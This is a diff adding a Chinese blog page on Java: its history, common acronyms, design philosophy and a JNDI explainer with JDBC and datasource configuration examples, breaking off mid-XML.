@@ -1,0 +1,1165 @@
+<!doctype html>
+<html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
+  data-bs-theme="auto" data-palette="blue">
+  <head><script src="/assets/init/bundle.min.49c380b864d080421f3bf1e7befef446294cec8900de086c8f166d7e653b8b33.js" integrity="sha256-ScOAuGTQgEIfO/Hnvv70RilM7IkA3ghsjxZtfmU7izM=" crossorigin="anonymous"></script>
+<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>java - decimo的小窝</title>
+    <link rel="icon" href="/favicon_hu_54a6302f02e0e2d1.png" sizes="16x16" type="image/png">
+    <link rel="icon" href="/favicon_hu_de41146c4fb04ef3.png" sizes="32x32" type="image/png">
+    <link rel="icon" href="/favicon_hu_f18a96cef7b3e3c9.png" sizes="150x150" type="image/png">
+    <link rel="apple-touch-icon" href="/favicon_hu_960aeb1d3a93909f.png" sizes="180x180" type="image/png">
+    <link rel="icon" href="/favicon_hu_5fdf2c175687e98d.png" sizes="192x192" type="image/png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1">
+<meta name="keywords" content="" />
+  <meta name="description" content="java的爱恨情仇" />
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://decimo.top/images/java.jpg">
+  <meta name="twitter:title" content="java">
+  <meta name="twitter:description" content="java的爱恨情仇">
+<meta property="og:url" content="https://decimo.top/posts/java/">
+  <meta property="og:site_name" content="decimo的小窝">
+  <meta property="og:title" content="java">
+  <meta property="og:description" content="java的爱恨情仇">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-10-31T18:35:35+08:00">
+    <meta property="article:modified_time" content="2026-10-31T18:35:35+08:00">
+    <meta property="og:image" content="https://decimo.top/images/java.jpg">
+
+  <meta itemprop="name" content="java">
+  <meta itemprop="description" content="java的爱恨情仇">
+  <meta itemprop="datePublished" content="2026-10-31T18:35:35+08:00">
+  <meta itemprop="dateModified" content="2026-10-31T18:35:35+08:00">
+  <meta itemprop="wordCount" content="1581">
+  <meta itemprop="image" content="https://decimo.top/images/java.jpg">
+  <meta itemprop="keywords" content="奇妙小知识">
+  <meta property="og:image:alt" content="java" />
+  <meta name="twitter:image:alt" content="java" />
+
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.5e43b1a2119e65d96e086e7147d978bfdbb1033637f8262ecddbd3fbaee298c1.css" integrity="sha256-XkOxohGeZdluCG5xR9l4v9uxAzY3+CYuzdvT+67imME=" crossorigin="anonymous">
+
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="/css/custom.08e4a19bad05b5ba15254446fc9f08cb715301d98267161e4f3ae021834445f8.css" integrity="sha256-COShm60FtboVJURG/J8Iy3FTAdmCZxYeTzrgIYNERfg=" crossorigin="anonymous"><script>
+(function () {
+  try {
+    var w = parseFloat(localStorage.getItem('hbs:content-width'));
+    if (w >= 8 && w <= 200) {
+      document.documentElement.style.setProperty('--rd-measure', w + 'rem');
+    }
+  } catch (e) {}
+})();
+</script>
+<script>
+(function() {
+  var originalTitle = document.title;
+  document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+      document.title = '下次再见~';
+    } else {
+      document.title = '欢迎回来~';
+      setTimeout(function() {
+        document.title = originalTitle;
+      }, 1500); 
+    }
+  });
+})();
+</script><link rel="stylesheet" href="/css/all.min.css">
+  </head>
+  <body><div class="reading-progress" aria-hidden="true"></div><header class="mb-4 sticky-top">
+  
+<nav class="top-app-bar shadow navbar navbar-expand-lg">
+  <div class="container">
+<a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
+    href="https://decimo.top/">
+    <picture><img class="logo " alt="Logo" src="https://decimo.top/images/logo.png?v=aa7d5f4fb143f00c0e5686ae2dd15c37" loading="lazy" width="1800" height="1800" />
+</picture>
+decimo的小窝
+</a>
+
+    <div class="offcanvas-lg offcanvas-end flex-grow-1" data-bs-scroll="true" tabindex="-1" id="navbarMenus" aria-labelledby="navbarMenusLabel">
+      <div class="offcanvas-header px-4 pb-0">
+        <div class="offcanvas-title h5" id="navbarMenusLabel">decimo的小窝</div>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" data-bs-target="#navbarMenus" aria-label="Close"></button>
+      </div>
+      <div class="offcanvas-body p-4 pt-0 p-lg-0">
+        <hr class="d-lg-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://decimo.top/posts/">Posts
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://decimo.top/categories/">Categories
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://decimo.top/archives/">Archive
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://decimo.top/friends/">Friends
+            </a>
+          </li>
+        </ul>
+        
+    <hr class="d-lg-none">
+    <form class="search-bar ms-auto my-auto" action="/search/" novalidate>
+      <div class="input-group align-items-center">
+        <span class="btn btn-search disabled position-absolute left-0 border-0 px-1">
+          <i class="fas fa-fw fa-search fa-lg"></i>
+        </span>
+        <input
+          class="my-1 form-control border-white rounded-5 search-input bg-body"
+          name="q"
+          type="search"
+          placeholder="Search"
+          aria-label="Search"
+          required>
+          <span class="search-shortcut position-absolute end-0 top-0 me-2">
+            <kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd>
+          </span>
+      </div>
+    </form><hr class="d-lg-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto">
+<li class="nav-item dropdown col-6 col-lg-auto">
+    <a class="nav-link px-0 py-2 px-lg-1" href="#" id="contentWidthDropdown" role="button"
+        data-bs-toggle="dropdown" data-bs-auto-close="outside" aria-expanded="false">
+        <i class="fas fa-fw fa-expand-alt"></i>
+        <span class="d-lg-none">宽度</span>
+    </a>
+    <ul class="content-width-menu dropdown-menu dropdown-menu-end p-3" aria-labelledby="contentWidthDropdown">
+        <li class="d-flex justify-content-between align-items-baseline mb-1">
+            <span class="small">正文宽度</span>
+            <span class="small text-secondary" id="contentWidthValue">42 字/行</span>
+        </li>
+        <li>
+            <input type="range" class="form-range content-width-range" id="contentWidthRange"
+                min="28" max="62" step="1" value="47" aria-label="正文宽度">
+        </li>
+        <li class="d-flex gap-1 mt-2">
+            <button type="button" class="btn btn-sm btn-outline-secondary flex-fill content-width-step" data-width="34">窄</button>
+            <button type="button" class="btn btn-sm btn-outline-secondary flex-fill content-width-step" data-width="47">标准</button>
+            <button type="button" class="btn btn-sm btn-outline-secondary flex-fill content-width-step" data-width="60">宽</button>
+        </li>
+    </ul>
+</li>
+
+<li class="nav-item dropdown col-6 col-lg-auto">
+    <a class="nav-link px-0 py-2 px-lg-1" href="#" id="paletteDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="fas fa-fw fa-palette"></i>
+        <span class="d-lg-none">Palette</span>
+    </a>
+    <ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby="paletteDropdown">
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue" aria-label="Blue"
+                    class="btn btn-sm w-100 palette text-bg-blue" data-palette="blue">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue-gray" aria-label="Blue Gray"
+                    class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette="blue-gray">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-brown" aria-label="Brown"
+                    class="btn btn-sm w-100 palette text-bg-brown" data-palette="brown">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-cyan" aria-label="Cyan"
+                    class="btn btn-sm w-100 palette text-bg-cyan" data-palette="cyan">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-green" aria-label="Green"
+                    class="btn btn-sm w-100 palette text-bg-green" data-palette="green">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-indigo" aria-label="Indigo"
+                    class="btn btn-sm w-100 palette text-bg-indigo" data-palette="indigo">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-orange" aria-label="Orange"
+                    class="btn btn-sm w-100 palette text-bg-orange" data-palette="orange">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-pink" aria-label="Pink"
+                    class="btn btn-sm w-100 palette text-bg-pink" data-palette="pink">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-purple" aria-label="Purple"
+                    class="btn btn-sm w-100 palette text-bg-purple" data-palette="purple">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-red" aria-label="Red"
+                    class="btn btn-sm w-100 palette text-bg-red" data-palette="red">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-teal" aria-label="Teal"
+                    class="btn btn-sm w-100 palette text-bg-teal" data-palette="teal">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-yellow" aria-label="Yellow"
+                    class="btn btn-sm w-100 palette text-bg-yellow" data-palette="yellow">
+                </a>
+            </li>
+    </ul>
+</li>
+<li class="nav-item dropdown col-6 col-lg-auto">
+    <a class="nav-link px-0 py-2 px-lg-1" href="#" id="modeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="mode-icon fas fa-fw fa-adjust" id="modeIcon"></i>
+        <span class="d-lg-none">Mode</span>
+    </a>
+    <ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="modeDropdown">
+        <li class="mode-item" data-color-mode="light" data-icon="sun">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-sun"></i> Light
+            </button>
+        </li>
+        <li class="mode-item" data-color-mode="dark" data-icon="moon">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-moon"></i> Dark
+            </button>
+        </li>
+        <li class="mode-item active" data-color-mode="auto" data-icon="adjust">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-adjust"></i> Auto
+            </button>
+        </li>
+    </ul>
+</li>
+        </ul>
+      </div>
+    </div>
+    <div class="d-flex">
+      <button class="navbar-toggler order-5 border-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#navbarMenus"
+        aria-controls="navbarMenus" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-ellipsis-h"></i>
+      </button>
+    </div>
+  </div>
+</nav>
+
+</header>
+
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.1bd71a046b6885a4fee75735eaf6540987ff0fa9d2a618d9b6f57586ffce5a10.js" integrity="sha256-G9caBGtohaT&#43;51c16vZUCYf/D6nSphjZtvV1hv/OWhA=" crossorigin="anonymous"></script>
+
+      <div class="row content"><noscript>
+    <div class="alert alert-danger" role="alert">Your browser does not support JavaScript.</div>
+</noscript>
+
+<div class="content-posts col-xxl-8">
+  <div class="container"><nav class="row card component" aria-label="breadcrumb">
+  <div class="card-body pb-0">
+    <ol class="hbs-breadcrumb breadcrumb flex-nowrap"><li class="breadcrumb-item text-surface"><a href="/">Home</a></li><li class="breadcrumb-item text-surface"><a href="/posts/">Posts</a></li><li class="breadcrumb-item active">java</li></ol>
+  </div>
+</nav><div class="post-panel-wrapper position-relative d-flex justify-content-center">
+  <div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1">
+    
+    
+
+    <a class="action btn-reward" role="button" data-bs-toggle="modal" data-bs-target="#rewardModal" title="Buy me a coffee">
+  <i class="fas fa-fw fa-coffee"></i>
+</a>
+    
+    
+  <a class="action action-toc d-none d-xxl-block" href="#postTOC" role="button" title="Contents">
+    <i class="fas fa-fw fa-list-alt"></i>
+  </a>
+<a class="action action-toc d-block d-xxl-none" href="#post-toc-container" role="button" title="Contents">
+  <i class="fas fa-fw fa-list-alt"></i>
+</a>
+    <a class="action action-copyright" href="#post-copyright" role="button" aria-label="Copyright" title="Copyright">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="Comments">
+  <i class="fas fa-fw fa-comments"></i>
+</a>
+    
+<a id="sidebarToggler" class="action action-sidebar-toggler d-none d-xl-block" role="button" title="Toggle sidebar">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+
+    
+  </div>
+</div><article class="row card component mb-4 post">
+  <div class="card-header ">
+    <h1 class="card-title post-title my-2">java</h1>
+  </div>
+  <div class="card-body"><div class="post-meta mb-3">
+  <span class="post-date me-1 mb-1" title="created on 2026-10-31 18:35:35 &#43;0800 CST.">October 31, 2026</span><span class="post-reading-time me-1 mb-1">16 min read</span><a href="/categories/%E5%A5%87%E5%A6%99%E5%B0%8F%E7%9F%A5%E8%AF%86/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+      <i class="fas fa-fw fa-folder me-1"></i>奇妙小知识</a>
+</div>
+
+      <p class="lead mb-3 text-body-emphasis">java的爱恨情仇</p>
+<div class="mt-2 mb-3 d-block d-xxl-none">
+    <h2 class="text-surface mb-3">Contents</h2>
+    <div id="post-toc-container">
+        </div>
+    <hr class="text-secondary">
+</div><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
+        <div id="post-content-body">
+<h1 id="前言" data-numberify>前言<a class="anchor ms-1" href="#前言"></a></h1>
+<p>这里只写一些我感觉对java比较有意思的内容吧，已经好久没水博客了。</p>
+<p>如果没学过 Java 的朋友，可能听说过 JDK，JRE，JVM 等等J字头神秘小缩写，还有各种神秘的 Java 版本号，听起来很乱很复杂。</p>
+<p>其实，正是在 Java 中，我才真正体会到编程语言的艺术。至少在大学课程里，Java 让我切实看到了编程的实用价值：丰富的类库、各种方法的使用、Web 编程以及异常处理机制，让我第一次感受到企业级开发的实际面貌，而这是此前学习 C++ 和 C 课程时完全体会不到的。（才疏学浅）</p>
+<p>那我们来讲讲一些神秘小知识。</p>
+
+<h1 id="java" data-numberify>Java<a class="anchor ms-1" href="#java"></a></h1>
+
+<h2 id="历史" data-numberify>历史<a class="anchor ms-1" href="#历史"></a></h2>
+<p>1995年5月23日，Java语言诞生。</p>
+<p>从此直到 Java 1.5 为止，都是以 1.x 的版本号命名的，但是为了表示 J2SE1.5 这个java版本的重要性，其更名为 Java SE 5.0 。从此往后，java版本就以整数为版本号，直到今天。</p>
+<p>java有不同的版本后缀：</p>
+<ul>
+<li>
+<p>SE 是 Standard Edition ，标准版，用于开发桌面和普通应用程序。</p>
+</li>
+<li>
+<p>EE 是 Enterprise Edition ，企业版，在SE的基础上增加了（Web、分布式）等企业级功能，用于开发服务器端的大型应用。</p>
+</li>
+<li>
+<p>ME 是 Micro Edition，微型版，用于手机等嵌入式设备。</p>
+</li>
+</ul>
+<p>java有很多神秘缩写，这里举几个常见的：</p>
+<ul>
+<li>
+<p>JDK 即 Java Development Kit，Java 开发工具包，是给开发者用的全家桶。它包含完整的 JRE，以及 javac 编译器、jar 打包工具、jdb 调试器等开发工具，用于编写、编译、调试和打包 Java 程序。简单说：JDK = JRE + 开发工具。</p>
+</li>
+<li>
+<p>JRE 即 Java Runtime Environment，Java 运行时环境，是运行 Java 程序所需的最小环境。它包含 JVM 和 Java 核心类库，负责让已经编译好的 Java 程序跑起来，但不包含 javac 这类编译工具。简单说：JRE = JVM + 核心类库。</p>
+</li>
+<li>
+<p>JVM 即 Java Virtual Machine，Java 虚拟机，它负责把编译生成的 .class 字节码翻译或编译成当前平台的机器指令并执行，同时管理内存、垃圾回收、线程等运行时事务。JVM 是 Java 实现“<strong>一次编译，到处运行</strong>”的核心：同一份字节码，由不同平台上的 JVM 分别翻译执行。</p>
+</li>
+<li>
+<p>JAR 即 Java Archive，是 Java 的标准压缩包格式，其本质是一个zip，将很多的 .class 文件、资源和配置文件打包成一个包，方便分发和运行。JAR 同样有 ZIP 的本地文件头、中央目录、文件条目、压缩数据等结构。在此基础上，JAR 还包含了一些 java 的约定，比如 META-INF/MANIFEST.MF 清单文件，Java 模块，类路径，签名等。玩mc的应该都知道.jar（）</p>
+</li>
+<li>
+<p>JIT 即 Just-In-Time Compiler，即时编译器。JIT 会在运行时把热点代码直接编译成本地机器码，大幅提升执行速度，是 JVM 高性能的关键。</p>
+</li>
+<li>
+<p>JNI 即 Java Native Interface，Java 本地接口，它规定了 Java 代码如何调用 C/C++ 写的函数。</p>
+</li>
+<li>
+<p>JDBC 即 Java Database Connectivity，Java 访问数据库的标准API，无论底下是 mysql 还是 oracle，Java 都可以通过JDBC来操作数据库。</p>
+</li>
+<li>
+<p>JNDI 即 Java Naming and Directory Interface，Java命名与目录接口，是用来在分布式环境里按名字找资源的API。</p>
+</li>
+</ul>
+<p>包含关系：</p>
+<p><picture><img class="img-fluid " alt="msedge_Z8TTaUWMS5" src="https://decimo.top/images/screenshoots/2026-10/msedge_Z8TTaUWMS5.png?v=57c529805d691a827e473f4ea33d2c0e" loading="lazy" width="445" height="296" />
+</picture>
+
+</p>
+
+<h2 id="哲学" data-numberify>哲学<a class="anchor ms-1" href="#哲学"></a></h2>
+<p>Java 的设计哲学可以浓缩成一句话：语言本身尽量简单、直白，避免复杂性和不确定性。这一点在和 C++、C# 对比时尤其明显。</p>
+<p>一个很能说明问题的细节是 <code>==</code>。在 C++ 和 C# 里，<code>==</code> 可以被重载为用户定义的行为，你看到 <code>a == b</code> 时并不总能确定它到底在比较什么。Java 不允许运算符重载，<code>==</code> 就是“两个引用是否指向同一个对象”，没有任何隐藏含义。代价是你比较对象内容时必须显式写 <code>equals()</code>，但换来的是一眼就能读懂、不会“骗人”的语义。</p>
+<p>这套哲学还体现在几个“故意不做”的决定上：</p>
+<ul>
+<li><strong>没有指针，只有引用</strong>。C++ 允许你直接操作内存地址，也允许你释放后继续使用（悬空指针）；Java 把直接内存访问拿掉，从语言层面堵住了一整类崩溃。</li>
+<li><strong>没有多重继承，用接口替代</strong>。C++ 的菱形继承是出名的复杂度来源；Java 只允许单继承类，但可以 implements 多个接口，用“行为契约”而不是“状态继承”来表达多态。C# 后来也跟随了这个选择。</li>
+<li><strong>默认没有全局变量和全局函数</strong>。一切代码必须在类里，C++ 那种散落在文件顶层的全局状态在 Java 里不存在。</li>
+</ul>
+<p>Java的所有代码都需要在一个类里面。哪怕你写一个 你好，世界！也必须包含在类里面。Java 命名要求 类名用大驼峰，方法/变量小驼峰，常量全大写下划线分割，包名全小写。总之，C++ 让你拥有很高的自由度，但要你自己来兜底。而 Java 则追求让你独到的每一行都没有歧义。</p>
+
+<h2 id="jndi" data-numberify>JNDI<a class="anchor ms-1" href="#jndi"></a></h2>
+<p>JNDI（Java Naming and Directory Interface，Java 命名和目录接口）是 SUN 公司提供的一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口（JNDI 服务供应接口，SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务、目录服务之间进行交互。</p>
+<p>这一大串是什么意思？</p>
+<p>首先要明白什么是“<strong>命名</strong>”和“<strong>目录</strong>”</p>
+
+<h3 id="命名服务" data-numberify>命名服务<a class="anchor ms-1" href="#命名服务"></a></h3>
+<p>其实我们很多时候都在用命名服务，其实它就是从一个值到另一个值的映射。对人类来说，记住一个有意义的名字比记住一大堆数字要容易得多。比如说DNS解析服务，你只要记住<code>www.baidu.com</code>，DNS就会通过这个域名去帮你找到百度的ip地址。</p>
+<p>这就是映射，把人类容易记住的域名映射为计算机更喜欢的数字。</p>
+
+<h3 id="目录服务" data-numberify>目录服务<a class="anchor ms-1" href="#目录服务"></a></h3>
+<p>目录比命名更多一层，它不只是“名字→值”，还可以按照属性查找，其条目本身也可以用层次结构。</p>
+<p>比如说图书馆检索系统。图书馆的每一本书都有书名，作者，分类等属性。你可以按书名找书，也可以按作者找、按分类号找，甚至限定“某个作者写的、某个分类下的书”。图书馆检索系统就是一个比较典型的目录服务：你不仅能按名称找到某个条目，还能利用条目的属性去筛选和查找。</p>
+
+<h3 id="回头" data-numberify>回头<a class="anchor ms-1" href="#回头"></a></h3>
+<p>理解了命名服务和目录服务，再回过头来看 JNDI：它是一个为 Java 应用程序提供命名服务的应用程序接口，为我们提供了查找和访问各种命名和目录服务的通用统一接口。</p>
+<p>通过 JNDI 统一接口，我们可以访问各种不同类型的服务。就像DNS是一种命名服务、图书馆检索系统是一种目录服务，JNDI 给 Java 程序提供了一个统一入口，去访问这类命名和目录服务。比如通过 JNDI API 可以访问 DNS 这类命名服务，也可以访问 LDAP 这类目录服务。</p>
+<p><picture><img class="img-fluid " alt="msedge_J6zMb2ZuaG" src="https://decimo.top/images/screenshoots/2026-11/msedge_J6zMb2ZuaG.png?v=69446f7a55a4764f55863bc933d1f056" loading="lazy" width="515" height="351" />
+</picture>
+
+</p>
+<p><strong>最顶层：Java Application（Java 应用程序）</strong>
+这就是你写的代码。你的代码想要找点东西（比如一个数据库连接、一个远程对象），但它不知道东西具体藏在哪里，也不知道怎么跟底层系统沟通。</p>
+<p><strong>第二层：JNDI API（统一门面）</strong>
+这是 JNDI 提供给开发者用的<strong>统一接口</strong>。这就好比你家所有的电器（电视、空调）都用同一个遥控器。你的代码只管对着 JNDI API 喊一句：“我要找叫 <code>xxx</code> 的东西”，不用管底下到底是用什么技术在找。</p>
+<p><strong>第三层：Naming Manager（命名管理器）</strong>
+这是 JNDI 内部的“大管家”。当你的代码发出查找请求后，管家会看：“哦，你要找的这个名字，应该归哪个底层服务管？”然后它负责把任务分派下去。</p>
+<p><strong>第四层：JNDI SPI（服务供应接口）与底层实现</strong>
+图里最下面那排黄色的方块（LDAP、DNS、NIS、NDS、RMI、CORBA），就是<strong>不同的底层服务</strong>。
+<strong>SPI（Service Provider Interface）</strong> 可以理解为**“驱动程序插槽”**。JNDI 定义了这个插槽的规格，而 LDAP、DNS 这些服务想要接入 JNDI，就得提供对应的“驱动程序”（实现 SPI 接口）。</p>
+<p>LDAP 就是企业里非常常用的目录服务。通过JNDI，Java代码就可以在LDAP服务器里查数据。</p>
+<p>RMI/CORBA 是早期的分布式对象技术，JNDI 可以作为一个注册表，帮你找到网络上另一个Java对象。</p>
+<p>在 CS61B 和 Java 等课程中，可以深刻的体会到 Java 高内聚低耦合的精神。</p>
+
+<h3 id="jndi-之前" data-numberify>JNDI 之前<a class="anchor ms-1" href="#jndi-之前"></a></h3>
+<p>在 JNDI 之前，我们先看看传统的 Java 数据库代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w">    </span><span class="c1">// 1. 手动加载驱动</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w">    </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.mysql.cj.jdbc.Driver&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w">    </span><span class="c1">// 2. 手动写死 URL、用户名、密码</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w">    </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="s">&#34;jdbc:mysql://MyDBServer?user=btop251&amp;password=123456&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w">    
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w">    </span><span class="c1">// 使用 conn 进行 SQL 操作</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w">    </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w">    
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w">    </span><span class="n">conn</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w">    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">conn</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w">            </span><span class="n">conn</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="n">SQLException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>这种“传统做法”在小规模开发中不会出问题，但一旦项目变大，麻烦就来了：</p>
+<ul>
+<li>
+<p><strong>配置写死</strong>：数据库服务器名、用户名、密码一旦改变，就得去改代码里的 JDBC URL。</p>
+</li>
+<li>
+<p><strong>强耦合</strong>：如果数据库从 MySQL 换成了 Oracle，不仅 JDBC 驱动包要换，代码里的驱动类名也要跟着改。</p>
+</li>
+<li>
+<p><strong>管理不便</strong>：随着并发增加，连接池参数需要调整，而这些通常应该在服务器端统一管理，而不是写死在代码里。</p>
+</li>
+</ul>
+<p>开发人员真正想要的是只关心“我要用一个数据库连接”，而不关心“这个连接是从哪个服务器、用哪个账号密码连上的”。</p>
+<p>为了解决这些问题，JNDI 闪亮登场。JNDI 的核心思路是：把找数据库这件事，从代码里挪到应用服务器（容器）的配置里。代码不再自己去“连”数据库，而是拿着一个名字去找容器要一个连接。</p>
+
+<h3 id="jndi-以后" data-numberify>JNDI 以后<a class="anchor ms-1" href="#jndi-以后"></a></h3>
+<p>有了 JNDI 以后，流程变成了两步：<strong>先在容器里配好，再在代码里按名查找。</strong></p>
+
+<h4 id="在容器中配置数据源" data-numberify>在容器中配置数据源<a class="anchor ms-1" href="#在容器中配置数据源"></a></h4>
+<p>在早期的 J2EE 容器（比如 JBoss）中，你需要提供一个 XML 配置文件。我们可以在里面定义一个数据源，给它起个名字（比如 <code>MySqlDS</code>），并把实际的 JDBC 参数写进去：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span> 
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nt">&lt;datasources&gt;</span> 
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="nt">&lt;local-tx-datasource&gt;</span> 
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">        <span class="c">&lt;!-- 给这个数据源起个名字，代码里就用这个名字找它 --&gt;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="nt">&lt;jndi-name&gt;</span>MySqlDS<span class="nt">&lt;/jndi-name&gt;</span> 
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="c">&lt;!-- 这里是具体的连接信息，只有运维或管理员需要关心 --&gt;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="nt">&lt;connection-url&gt;</span>jdbc:mysql://localhost:3306/lw<span class="nt">&lt;/connection-url&gt;</span> 
